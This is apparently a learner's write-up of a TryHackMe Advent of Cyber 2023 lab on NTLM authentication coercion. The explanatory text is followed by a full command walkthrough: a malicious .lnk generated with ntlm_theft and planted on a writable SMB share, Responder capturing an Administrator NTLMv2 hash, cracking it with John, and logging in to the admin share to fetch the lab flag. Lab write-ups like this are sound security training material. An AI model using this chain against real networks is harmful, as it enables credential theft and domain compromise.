
#   Task 29  [Day 23] Coerced Authentication Relay All the Way

#ntlm
## Learning Objectives

- The basics of network file shares
- Understanding NTLM authentication
- How NTLM authentication coercion attacks work
- How Responder works for authentication coercion attacks
- Forcing authentication coercion using `lnk` files


## Introduction

In today’s task, we will look at NTLM authentication and how threat actors can perform authentication coercion attacks. By coercing authentication, attackers can uncover sensitive information that can be used to gain access to pretty critical stuff. Let’s dive in!

## Sharing Is Caring

We tend to think of computers as isolated devices. This may be true to an extent, but the real power of computing comes into play when we connect to networks. This is where we can start to share resources in order to achieve some pretty awesome things. In corporate environments, networks and network-based resources are used frequently. For example, in a network there’s no need for every user to have their own printer. Instead, the organisation can buy a couple of large printers that all employees can share. This not only saves costs but allows administrators to manage these systems more easily and centrally.

Another example of this is file shares. Instead of each employee having local copies of files and needing to perform crazy version control when sharing files with other employees via old-school methods like flash drives, the organisation can deploy a network file share. Since the files are stored in a central location, it’s easy to access them and ensure everyone has the latest version to hand. Administrators can also add security to file shares to ensure that only authenticated users can access them. Additionally, access controls can be applied to ensure employees can only access specific folders and files based on their job role.

However, it’s these same file shares that can land an organisation in hot water with red teamers. Usually, any employee has the ability to create a new network file share. Security controls are not often applied to these shares, allowing any authenticated user to access their contents. This can cause two issues:

- If a threat actor gains read access, they can look to exfiltrate sensitive information. In file shares of large organisations, you can often find interesting things just lying around, such as credentials or sensitive customer documents.
- If the threat actor gains write access, they could alter information stored in the share, potentially overwriting critical files or staging other attacks (as we’ll see in this task).

Before we can perform any of these types of attacks, we first need to understand how authentication works for network file shares.

## NTLM Authentication

In the Day 11 task, we learned about Active Directory (AD) and Kerberos authentication. File shares are often used on servers and workstations connected to an AD domain. This allows AD to take care of access management for the file share. Once connected, it’s not only local users on the host who will have access to the file share; all AD users with permissions will have access, too. Similar to what we saw on Day 11, Kerberos authentication can be used to access these file shares. However, we’ll be focusing on the other popular authentication protocol: NetNTLM or NTLM authentication.

Before we dive into NTLM authentication, we should first talk about the Server Message Block protocol. The SMB protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the “out of paper” alert your computer receives when you try to print a document is the work of the SMB protocol. However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, legacy systems don’t support them, so organisations rarely enforce their use.

NetNTLM, often referred to as Windows Authentication or just NTLM Authentication, allows the application to play the role of a middleman between the client and AD. NetNTLM is a very popular authentication protocol in Windows and is used for various different services, including SMB and RDP. It is used in AD environments as it allows servers (such as network file shares) to pass the buck to AD for authentication. Let’s take a look at how it works in the animation below:

When a user wants to authenticate to a server, the server responds with a challenge. The user can then encrypt the challenge using their password (not their actual password, but the hash derived from the password) to create a response that is sent back to the server. The server then passes both the challenge and response to the domain controller. Since it knows the user’s password hash, it can verify the response. If the response is correct, the domain controller can notify the server that the user has been successfully authenticated and that the server can provide access. This prevents the application or server from having to store the user’s credentials, which are now securely and exclusively stored on the domain controller. Here’s the trick: if we could intercept these authentication requests and challenges, we could leverage them to gain unauthorised access. Let’s dive in a bit deeper.

## Responding to the Race

There are usually lots of authentication requests and challenges flying around on the network. A popular tool that can be used to intercept them is [Responder](https://github.com/lgandx/Responder). Responder allows us to perform man-in-the-middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they want to connect to.

On a real LAN, Responder will attempt to poison any Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, first, hosts can attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try to find a proxy for future HTTP(s) connections.

Since these protocols rely on requests broadcasted on the local network, our rogue device running Responder would receive them too. They would usually just be dropped since they were not meant for our host. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

If you want to dive a bit deeper into using Responder for these poisoning attacks, have a look at the [Breaching Active Directory](https://tryhackme.com/room/breachingad) room.

This was an incredibly popular red teaming technique to perform when it was possible to gain access to an office belonging to the target corporation. Simply plugging in a rogue network device and listening with Responder for a couple of hours would often yield several challenges that could then be cracked offline or relayed. Then, the pandemic hit and all of a sudden, being in the office was no longer cool. Most employees connected from home using a VPN. While this was great for remote working, it meant intercepting NetNTLM challenges was no longer really viable. Users connecting via VPN (which, in most cases, isn’t considered part of the local network) made it borderline impossible to intercept and poison LLMNR requests in a timely manner using Responder.

Now, we have to get a lot more creative. Cue a little something called coercion!

## Unconventional Coercion

If we can’t just listen to and poison requests, we just have to create our own! This brings a new attack vector into the spotlight: coercion. Instead of waiting for requests, we coerce a system or service to authenticate us, allowing us to receive the challenge. Once we get this challenge, based on certain conditions, we can aim to perform two main attacks:

- If the password of the account coerced to authenticate is weak, we could crack the corresponding NetNTLM challenge offline using tools such as Hashcat or John the Ripper.
- If the server or service’s security configuration is insufficient, we could attempt to relay the challenge in order to impersonate the authenticating account.

Two incredibly popular versions of coerced authentication are PrintSpooler and PetitPotam.

PrintSpooler is an attack that coerces the Print Spooler service on Windows hosts to authenticate to a host of your choosing. PetitPotam is similar but leverages a different issue to coerce authentication. In these cases, it’s the machine account (the actual server or computer) that performs the authentication. Normally, machine account passwords are random and change every 30 days, so there isn’t really a good way for us to crack the challenge. However, often, we can relay this authentication attempt. By coercing a very privileged server, such as a domain controller, and then relaying the authentication attempt, an attacker could compromise not just a single server but all of AD!

If you are interested in learning more about these coercion attacks, have a look at the [Exploiting Active Directory](https://tryhackme.com/room/exploitingad) room.

## Procesando

- Generamos el archivo infectado

```
sudo python3 /opt/ntlm_theft/ntlm_theft.py -g lnk -s 10.2.6.197 -f stealthy

```

```
smbclient //10.10.46.180/ElfShare -U guest%
Try "help" to get a list of possible commands.
smb: \> put stealthy.lnk
putting file stealthy.lnk as \stealthy.lnk (3.5 kb/s) (average 3.5 kb/s)
smb: \> dir
  .                                   D        0  Sat Dec 23 22:28:01 2023
  ..                                  D        0  Sat Dec 23 22:28:01 2023
  EXCO                                D        0  Wed Nov 22 05:07:20 2023
  greedykeys.txt                      A     2446  Thu Nov 23 11:50:09 2023
  HR                                  D        0  Wed Nov 22 05:06:57 2023
  IT                                  D        0  Wed Nov 22 05:07:02 2023
  SALES                               D        0  Wed Nov 22 05:07:05 2023
  stealthy.lnk                        A     2164  Sat Dec 23 22:28:01 2023
  SUPPORT                             D        0  Thu Nov 23 04:28:06 2023

                7863807 blocks of size 4096. 3814068 blocks available
smb: \> 
```

```
sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.2.6.197]
    Responder IPv6             [fe80::5409:7f10:e037:dfd0]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-P4OAGM7D5Y9]
    Responder Domain Name      [4FA5.LOCAL]
    Responder DCE-RPC Port     [48126]

[+] Listening for events...                                                                            

[SMB] NTLMv2-SSP Client   : 10.10.46.180
[SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:254cc7c227d3973c:33EF74305574228C705FF0177D6BF2BD:0101000000000000803F8A3CEF35DA01637F02848BCE203C0000000002000800340046004100350001001E00570049004E002D00500034004F00410047004D003700440035005900390004003400570049004E002D00500034004F00410047004D00370044003500590039002E0034004600410035002E004C004F00430041004C000300140034004600410035002E004C004F00430041004C000500140034004600410035002E004C004F00430041004C0007000800803F8A3CEF35DA0106000400020000000800300030000000000000000000000000300000A420B442F2D2ADC34B50BD451DD0DE482FFD257905B7AD69A774A721B8F62E380A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0032002E0036002E003100390037000000000000000000                                                                                               
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[+] Exiting...

```

- crack hash
```
john -w=greedykeys.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
GreedyGrabber1@  (Administrator)     
1g 0:00:00:00 DONE (2023-12-23 22:33) 100.0g/s 26300p/s 26300c/s 26300C/s Spring2017..starwars
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

- acceder como admin y descargar la bandera
```
smbclient //10.10.46.180/C$ -U Administrator%GreedyGrabber1@
Try "help" to get a list of possible commands.
smb: \> cd \users\desktop
cd \users\desktop\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd /users/administrator/desktop
smb: \users\administrator\desktop\> dir
  .                                  DR        0  Thu Nov 23 12:08:29 2023
  ..                                 DR        0  Thu Nov 23 12:08:29 2023
  desktop.ini                       AHS      282  Wed Mar 17 10:13:27 2021
  EC2 Feedback.website                A      527  Tue Jun 21 10:36:17 2016
  EC2 Microsoft Windows Guide.website      A      554  Tue Jun 21 10:36:23 2016
  flag.txt                            A       40  Thu Nov 23 12:09:10 2023

                7863807 blocks of size 4096. 3850151 blocks available
smb: \users\administrator\desktop\> get flag.txt 
getting file \users\administrator\desktop\flag.txt of size 40 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \users\administrator\desktop\> 

 cat flag.txt                          
THM{Greedy.Greedy.McNot.So.Great.Stealy} 
```


I completed  Task 29  [Day 23] Coerced Authentication Relay All the Way!, Don't miss out Tryhackme #AdventOfCyber @RealTryHackMe https://tryhackme.com/room/adventofcyber2023